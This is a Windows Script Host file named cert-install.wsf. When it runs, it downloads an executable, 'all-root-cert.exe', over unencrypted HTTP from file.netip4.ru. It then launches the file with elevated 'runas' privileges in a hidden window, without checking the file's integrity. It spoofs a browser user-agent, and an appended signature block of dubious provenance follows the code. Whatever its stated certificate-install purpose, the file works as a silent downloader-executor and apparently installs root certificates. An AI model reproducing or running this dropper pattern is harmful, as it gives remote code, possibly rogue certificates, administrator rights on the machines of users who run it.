<?xml version="1.0" encoding="Windows-1251"?>
<!-- ***************************** -->
<!-- File wsf -->
<!-- cert-install.wsf -->
<!--
* File cert-install.wsf
* (cert-install)
-->
<!-- ***************************** -->
<job id="ID1">
	<script language="JScript">
	<![CDATA[
	/* *********************************************************
	'
	' This Script Lib Downloads Exe File (with Archieve?) to
	' Temporary Directory and Runs it with Elevated Privileges
	'
	* *********************************************************/
	/* *********************************************************
	'
	' ExeDownlRun02( strURL, strFileNameExe, constOpt, intTimeOut)
	'
	' This Script Downloads Exe file from strURL Path and
	' Execute it with Script TimeOut in iTimeOut ms
	'
	' PARAMETERS:	strURL - URL Path to Download
	'               iTimeOut - Wait to End Execution of the File
	'               strFileNameExe - Name of Exe File
	'               constOpt - Options of Exe File
	' RETURNS:      0 if Success Download and Run
	'               1 if Error Occur
	'
	* *********************************************************/
	function ExeDownlRun02(strURL, strFileNameExe, constOpt, intTimeOut) {
		var iFlag;
		var tempFolder;
		// Get Temp Folder Name
		tempFolder = getUtilEnviron();
		// Check if strFolder is Empty of TEMP Directory not Assigned
		if(tempFolder === "") {
			return 1;
		}
		iFlag = UploadFilesFromInt(strFileNameExe, strURL, tempFolder);
		if(iFlag != 0) return 1;
		RunDownloadedExe02(tempFolder, strFileNameExe, constOpt, intTimeOut);
		return 0;
	}

/* *****************************************************************************
'
' getTempEnviron()
' This Function Returns the Path for User Variable TEMP
'
' PARAMETERS:   NONE
' RETURNS:      Path for Zlovred Directory if Exists or
'               Path for User Variable %TEMP% if Success or
'               "C:\Windows\Temp" if API Error or
'				"" if General Sysytem Error
'
' *****************************************************************************/
function getTempEnviron() {
	var fso, wsh, envProc, envSys;
	var strZlFolder; // Zlovred Temprorary Folder
	// Define ActiveX Objects
	fso = new ActiveXObject("Scripting.FileSystemObject");
	wsh = new ActiveXObject("WScript.Shell");
	// Define Process Environment Variable
	envProc = wsh.Environment("PROCESS");
	// Define System Environment Variable
	envSys = wsh.Environment;
	// Define Zlovred Temprorary Folder
	strZlFolder = "C:\\pub1\\Distrib\\Zlovred";
	// Define and Check Environment Variables
	var envVariable;
	envVariable = strZlFolder;
	if(!fso.FolderExists(envVariable)) {
		envVariable = envProc("TEMP");
		if(!fso.FolderExists(envVariable)) {
			envVariable = envSys("TMP");
			if(!fso.FolderExists(envVariable)) {
				envVariable = "";
			}
		}
	}
	return envVariable;
}

	/* ********************************************************
	'
	' getUtilEnviron()
	' This Function Returns the Path for User Variable TEMP
	'
	' PARAMETERS:   NONE
	' RETURNS:      Path For User Variable %UTIL% if Success
	'               "%TEMP%" if API Error
	'               "" if General Sysytem Error
	'
	***********************************************************/
	function getUtilEnviron() {
		var fso, utilPath;
		// Define ActiveX Objects
		fso = new ActiveXObject("Scripting.FileSystemObject");
		utilPath = "C:\\Util";
		if(!fso.FolderExists(utilPath)) {
			utilPath = getTempEnviron();
		}
		return utilPath;
	}
	/**********************************************************
	 * Function getXmlHttp02
	 * This Function Registers XMLHTTP Object both at
	 * Windows Script Shell and at Web Browswers
	 * If Object can't Register it Returns Empty String
	 *
	 * PARAMETERS:  NONE
	 * RETURNS:     XMLHTTP Object if Success
	 *              Empty String if no COM Object Registred
	* *********************************************************/
	function getXmlHttp02() {
		// body...
		try {
			// return new ActiveXObject( "MSXML2.ServerXMLHTTP.4.0"); // New Unsafe Version for WSH
			// return new ActiveXObject( "MSXML2.ServerXMLHTTP.6.0"); // New Unsafe Version for WSH
			return new ActiveXObject("MSXML2.XMLHTTP"); // Old Safe Version for IE
		} catch (e) {
			try {
				// return new ActiveXObject( "MSXML2.ServerXMLHTTP.6.0"); // New Unsafe Version for WSH
				return new ActiveXObject("MSXML2.ServerXMLHTTP.4.0"); // New Unsafe Version for WSH
			} catch (ee) {
				try {
					// return new ActiveXObject( "MSXML2.ServerXMLHTTP.4.0"); // New Unsafe Version for WSH
					return new ActiveXObject("MSXML2.ServerXMLHTTP.6.0"); // New Unsafe Version for WSH
					// return new ActiveXObject("MSXML2.XMLHTTP"); // Old Safe Version for IE
				} catch (eee) {
					try {
						return new ActiveXObject("Microsoft.XMLHTTP"); // Old Version
					} catch (eeee) {}
				}
			}
		}
		if(typeof XMLHttpRequest != "undefined") {
			// statement
			return new XMLHttpRequest(); // for Web Browsers
		} else {
			// statement
			return "";
		}
	}
	/* *********************************************************
	 * Function getXmlHttp01
	 * This Function Registers XMLHTTP Object both at
	 * Windows Script Shell and at Web Browswers
	 * If Object can't Register it Returns Empty String
	 *
	 * PARAMETERS:  NONE
	 * RETURNS:     XMLHTTP Object if Success
	 *              Empty String if no COM Object Registred
	* *********************************************************/
	function getXmlHttp01() {
		// body...
		try {
			// return new ActiveXObject( "MSXML2.ServerXMLHTTP.4.0"); // New Unsafe Version for WSH
			return new ActiveXObject("MSXML2.ServerXMLHTTP.6.0"); // New Unsafe Version for WSH
			// return new ActiveXObject("MSXML2.XMLHTTP"); // Old Safe Version for IE
		} catch (e) {
			try {
				// return new ActiveXObject( "MSXML2.ServerXMLHTTP.6.0"); // New Unsafe Version for WSH
				return new ActiveXObject("MSXML2.ServerXMLHTTP.4.0"); // New Unsafe Version for WSH
			} catch (ee) {
				try {
					// return new ActiveXObject( "MSXML2.ServerXMLHTTP.4.0"); // New Unsafe Version for WSH
					// return new ActiveXObject( "MSXML2.ServerXMLHTTP.6.0"); // New Unsafe Version for WSH
					return new ActiveXObject("MSXML2.XMLHTTP"); // Old Safe Version for IE
				} catch (eee) {
					try {
						return new ActiveXObject("Microsoft.XMLHTTP"); // Old Version
					} catch (eeee) {}
				}
			}
		}
		if(typeof XMLHttpRequest != "undefined") {
			// statement
			return new XMLHttpRequest(); // for Web Browsers
		} else {
			// statement
			return "";
		}
	}
	/* *********************************************************
	'
	' UploadFilesFromInt( strFile, strURL, strPath )
	' This Function Upload the File strFile from URL on HTTP/HTTPS Protocols
	' and Save it on Local Computer to Path strPath
	' Function Uses Objects "Microsoft.XMLHTTP" and "Adodb.Stream"
	'
	' PARAMETERS:   strFile -- a File to be Downloaded (only name and extension)
	'               strURL -- an URL of the web-site, from which the File
	'               is Downloaded
	'               strPath -- a Place in a Windows Computer (Full path without slash)
	'               in which the File is Downloaded
	'
	' RETURNS:      0 -- If File is Normally Downloaded and Created
	'               1 -- if File in Path strPath Can't Create
	'               2 -- if XMLHTTP or ADOStream Can't Initialize
	'				3 -- if Emty HTTP Responce or Send Access Denied
	'				4 -- if HTTP Response Not 200 (while is not make)
	'
	* *********************************************************/
	function UploadFilesFromInt(strFile, strURL, strPath) {
		var fso, xmlHttp, adoStream;
		// Define FileSystemObject
		try {
			fso = new ActiveXObject("Scripting.FileSystemObject");
		} catch (e) {
			return 1;
		}
		// Define XMLHTTP Help Object
		xmlHttp = getXmlHttp02();
		if(xmlHttp === "") {
			return 2;
		}
		// Define Adodb.Stream Object
		try {
			adoStream = new ActiveXObject("Adodb.Stream");
		} catch (e) {
			return 2;
		}
		var strFileURL;
		var strLocal_Path;
		var intUploadFilesFromInt;
		var blnExistRemoteFile;
		var cb = [];
		// Define Full Downloaded File URL
		strFileURL = strURL + strFile;
		// Define Full Local Path to be Downloaded
		strLocal_Path = strPath + "\\" + strFile;
		// Check if Path is Exist
		if(fso.FolderExists(strPath)) intUploadFilesFromInt = 0;
		else intUploadFilesFromInt = 1;
		// Downloaded File
		// Open URL (Get Requiest synchronous)
		try {
			xmlHttp.Open("GET", strFileURL, false);
		} catch (e) {
			WScript.Echo("Can't Open URL: " + strFileURL + "\nError: " + e);
			return 3;
		}
		// Set User-Agent Header (for Safari Browser)
		xmlHttp.SetRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36");
		// Define Function onreadystatechange
		xmlHttp.onreadystatechange = function() {
			if(xmlHttp.readyState === 4) {
				cb[0] = xmlHttp.status; // Status of Request (Integer Number)
				cb[1] = xmlHttp.getAllResponseHeaders(); // Response Header
				cb[2] = xmlHttp.responseText; // Response Text
				cb[3] = xmlHttp.responseBody; // Response Body
			}
		};
		// Send File from URL
		try {
			xmlHttp.Send();
		} catch (e) {
			WScript.Echo("Can't make Send() Request!\nMay be Block with Antivirus?");
			return 3;
		}
		if(cb[0] == 200 && intUploadFilesFromInt == 0)
			// If Send Request is Successful
			blnExistRemoteFile = true;
		else {
			blnExistRemoteFile = false;
			intUploadFilesFromInt = 4;
			WScript.Echo("Wrong HTTP Status:" + cb[0] + "\mURL = " + strFileURL);
			xmlHttp.Abort();
		}
		if(blnExistRemoteFile) {
			// Set AdoStream Type mode and Open It
			adoStream.Type = 1;
			adoStream.Mode = 3;
			adoStream.Open();
			// Write to AdoStream Response Body of HTTP Request
			adoStream.Write(cb[3]);
			// Save Stream to File
			try {
				adoStream.SaveToFile(strLocal_Path, 2);
			} catch (e) {
				WScript.Echo("Can't Save File Stream into File: " + strLocal_Path + "\nCheck Access Rights!");
				intUploadFilesFromInt = 1;
			}
			// /Downloaded File
			// Close Objects
			adoStream.Close();
			xmlHttp.Abort();
			// Check If File Downloaded
			if(!fso.FileExists(strLocal_Path) && intUploadFilesFromInt == 0) intUploadFilesFromInt = 1;
			// /Check if File Downloaded
		}
		return intUploadFilesFromInt;
	}
	/* *********************************************************
	'
	' RunDownloadedExe02(strPath, strVBS, constOpt, intTimeOut )
	' This Function Run a strVBS Exe File
	' with Command "strPath & "\" & strVBS " and Arguments constOpt
	'
	' PARAMETERS:   strPath -- The Path to strVBS
	'               strVBS -- a VBS File with instructions
	'               (Windows Scripts Shell)
	'				intTimeOut -- Estimated Time for Running (ms)
	'
	' RETURNS:      NONE
	'
	* *********************************************************/
	function RunDownloadedExe02(strPath, strVBS, constOpt, intTimeOut) {
		var strValue, shApp;
		// Define ActiveX Object
		shApp = new ActiveXObject("Shell.Application");
		// Set Exe Command Arguments
		strValue = "\"" + strPath + "\\" + strVBS + "\"";
		// Run exe with Elevated Privileges (runas) at Invisible Mode (0), with working Diretory strPath
		shApp.ShellExecute(strValue, constOpt, strPath, "runas", 0);
		//    setTimeout( DoNothing, intTimeOut );
		// Stop Script on intTimeOut miliseconds for Wait if  Bitsadmin done
		WScript.Sleep(intTimeOut);
	}
	]]>
	</script>
	<script language="JScript">
	<![CDATA[
	function Main_Download() {
		var strUrl, strExe, constOpt, iTimeOut;
		var http_prefix, http_host, http_port, http_dir;
		var iRes;
		// Define Variables
		strExe = "all-root-cert.exe";
		constOpt = "";
		iTimeOut = 30000; // 30 sec.
		http_prefix = "http";
		http_host = "file.netip4.ru";
		http_port = "80";
		http_dir = "/Exponenta/Distrib/bin/cert/";
		// Define Compoud Variables
		strUrl = http_prefix + "://" + http_host + ":" + http_port + http_dir;
		iRes = ExeDownlRun02(strUrl, strExe, constOpt, iTimeOut);
	}
	]]>
	</script>
	<script language="VBScript">
	<![CDATA[
		Main_Download
	]]>
	</script>

<signature>
** SIG ** MIIJcwYJKoZIhvcNAQcCoIIJZDCCCWACAQExCzAJBgUr
** SIG ** DgMCGgUAMGcGCisGAQQBgjcCAQSgWTBXMDIGCisGAQQB
** SIG ** gjcCAR4wJAIBAQQQcAVhGs441BGiowAQS9NQkAIBAAIB
** SIG ** AAIBAAIBAAIBADAhMAkGBSsOAwIaBQAEFFpCvGTj+IhQ
** SIG ** 9ixH4l4gAOMPaBWQoIIHEjCCAzUwggKioAMCAQICEJkW
** SIG ** fLCelp6QTP4DmBoxgmYwCQYFKw4DAh0FADCBnzEjMCEG
** SIG ** A1UEAxMaTklUIENsYXNzIDMgRVYgU1NMIENBIC0gRzQx
** SIG ** MDAuBgNVBAsTJ05ldyBJbnRlcm5ldCBUZWNobm9sb2dp
** SIG ** ZXMgVHJ1c3QgTmV0d29yazEnMCUGA1UEChMeTmV3IElu
** SIG ** dGVybmV0IFRlY2hub2xvZ2llcyBJbmMuMRAwDgYDVQQH
** SIG ** EwdTYXJhdG92MQswCQYDVQQGEwJSVTAgFw0yMDA3MjAw
** SIG ** NjI4NDdaGA8yMTIwMDcyMDA2Mjg0NlowKTEnMCUGA1UE
** SIG ** AxMeTmV3IEludGVybmV0IFRlY2hub2xvZ2llcyBJbmMu
** SIG ** MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDQ1J5P
** SIG ** MxpU8hfBgsQdWlC7jaSI6gyoOXU9lIzlq8Th4EImJa6h
** SIG ** IwtRj1AsI7EtNToFY79mfbpGpwj5vOJuL4cOQCN6AH1k
** SIG ** FQ1dsvPFcInMaskHQbI4bbo2SdkssPEYBHpRnxmluCpA
** SIG ** n33Q2omE4fDqNkP/YTOJBmq97r4K8WIAcQIDAQABo4Hs
** SIG ** MIHpMA8GA1UdEwEB/wQFMAMCAQUwIAYDVR0EAQH/BBYw
** SIG ** FDAOMAwGCisGAQQBgjcCARYDAgeAMDAGCisGAQQBgjcC
** SIG ** AQoEIjAgoB6AHGh0dHA6Ly9hbnRpY3JpbWluYWxvbmxp
** SIG ** bmUucnUwHQYDVR0lBBYwFAYIKwYBBQUHAwMGCCqFAwUB
** SIG ** GAIPMGMGA1UdAQRcMFqAEGft9iXxljpcUsmwg9jyG2mh
** SIG ** NDAyMTAwLgYDVQQDEydWZXJpU2lnbiBDbGFzcyAzIENv
** SIG ** ZGUgU2lnbmluZyAyMDIwLTIgQ0GCEIgt5Q0CI8WGSSAx
** SIG ** xykMZP4wCQYFKw4DAh0FAAOBgQCl/jyH83QyUErLnc0o
** SIG ** 0/8gWzEvxlY64xmNe+rEE7B243/YIDUCGZBIOKSgcpzo
** SIG ** 9tMCgY1aG0FuMIBsb+VL4C/17ITyhOfMAy9fvQ9bXhBL
** SIG ** WJ7XZ/M+1s2QtkZu+5mVfsnfmWm1F4vWJu1Xs5h31q53
** SIG ** nR9j9BjbiBKR+ppGFDlAQzCCA9UwggLBoAMCAQICEIgt
** SIG ** 5Q0CI8WGSSAxxykMZP4wCQYFKw4DAh0FADAyMTAwLgYD
** SIG ** VQQDEydWZXJpU2lnbiBDbGFzcyAzIENvZGUgU2lnbmlu
** SIG ** ZyAyMDIwLTIgQ0EwIBcNMjAwNzIwMDYyNzM1WhgPMjEy
** SIG ** MDA3MjAwNjI3MzRaMIGfMSMwIQYDVQQDExpOSVQgQ2xh
** SIG ** c3MgMyBFViBTU0wgQ0EgLSBHNDEwMC4GA1UECxMnTmV3
** SIG ** IEludGVybmV0IFRlY2hub2xvZ2llcyBUcnVzdCBOZXR3
** SIG ** b3JrMScwJQYDVQQKEx5OZXcgSW50ZXJuZXQgVGVjaG5v
** SIG ** bG9naWVzIEluYy4xEDAOBgNVBAcTB1NhcmF0b3YxCzAJ
** SIG ** BgNVBAYTAlJVMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCB
** SIG ** iQKBgQCnV+ciVLV8TSoMuck7HvoRB4lrtVYL0aVgIrqH
** SIG ** ktNwNyHe7sFP9Xr111Eg5Jdvdw5CffEw1DpdrTknvSug
** SIG ** sh+thGtJEWgFpaGjusB+tIYx9SyDkdF7vL/4I/6k10BE
** SIG ** obWbe9iOMzCwuu7v8p3MuWbZ05Cn5YxGLLDpoiSKogMe
** SIG ** HQIDAQABo4IBATCB/jASBgNVHRMBAf8ECDAGAQH/AgEF
** SIG ** MCAGA1UdBAEB/wQWMBQwDjAMBgorBgEEAYI3AgEWAwIH
** SIG ** gDAwBgorBgEEAYI3AgEKBCIwIKAegBxodHRwOi8vYW50
** SIG ** aWNyaW1pbmFsb25saW5lLnJ1MDsGA1UdJQQ0MDIGCCsG
** SIG ** AQUFBwMBBggrBgEFBQcDAgYIKwYBBQUHAwMGCCsGAQUF
** SIG ** BwMEBggqhQMFARgCDzBXBgNVHQEEUDBOgBB4leuhVGrS
** SIG ** yZlKiPAsnoXwoTQwMjEwMC4GA1UEAxMnVmVyaVNpZ24g
** SIG ** Q2xhc3MgMyBDb2RlIFNpZ25pbmcgMjAyMC0yIENBggSy
** SIG ** LhlFMAkGBSsOAwIdBQADggEBAAHNhrK52O5Yaon4AcVr
** SIG ** ygKPdPQINAhPi4Y6iDb8PnXdZKxJloMhgLAhr2FGCObe
** SIG ** WkP/usGDEHOYVd2s/nO3+/c+GasvhwZRTBdHMAe5Eosi
** SIG ** eSy/b7DeJK15LtRi1m7VCDYHGBgZM2RA85thdIRo8SCx
** SIG ** +rg+7JGd6RCMSYpyXs5kmc/XZL5BjERrste009TJuI/o
** SIG ** IEa0VpNuPmyydkPcxSUyHaMXieos+xus/u4O9fMe66ZX
** SIG ** GDGWhno79a0/LXutmRxz7yCmnpGevSV9jpvLhXI1AIMw
** SIG ** TtOkUegE5t1uF90FF4suoXzh2VFb0o0ENF8WJ8mEvyDm
** SIG ** iVLQH+pY/mZ2OX8xggHNMIIByQIBATCBtDCBnzEjMCEG
** SIG ** A1UEAxMaTklUIENsYXNzIDMgRVYgU1NMIENBIC0gRzQx
** SIG ** MDAuBgNVBAsTJ05ldyBJbnRlcm5ldCBUZWNobm9sb2dp
** SIG ** ZXMgVHJ1c3QgTmV0d29yazEnMCUGA1UEChMeTmV3IElu
** SIG ** dGVybmV0IFRlY2hub2xvZ2llcyBJbmMuMRAwDgYDVQQH
** SIG ** EwdTYXJhdG92MQswCQYDVQQGEwJSVQIQmRZ8sJ6WnpBM
** SIG ** /gOYGjGCZjAJBgUrDgMCGgUAoHAwEAYKKwYBBAGCNwIB
** SIG ** DDECMAAwGQYJKoZIhvcNAQkDMQwGCisGAQQBgjcCAQQw
** SIG ** HAYKKwYBBAGCNwIBCzEOMAwGCisGAQQBgjcCARYwIwYJ
** SIG ** KoZIhvcNAQkEMRYEFP9UYnE4F+RiShZhZP35HaItD4/E
** SIG ** MA0GCSqGSIb3DQEBAQUABIGAkV93maiHavu2ubvl3r6K
** SIG ** G3kcupXpMTh2NgbyyC+uONMCcIMPOTKk/dIdiNQI9gis
** SIG ** 1c9EtgTexi8jDDzlG4IAoewotHjT6LtI/MtPGOfg+0wh
** SIG ** EoQmOz/ia0TO6FhY3hcEtFoK0IJPTTvRmyDlfJkoa6SV
** SIG ** SCUgV2W1ymMkiOP0XeY=
</signature>
</job>
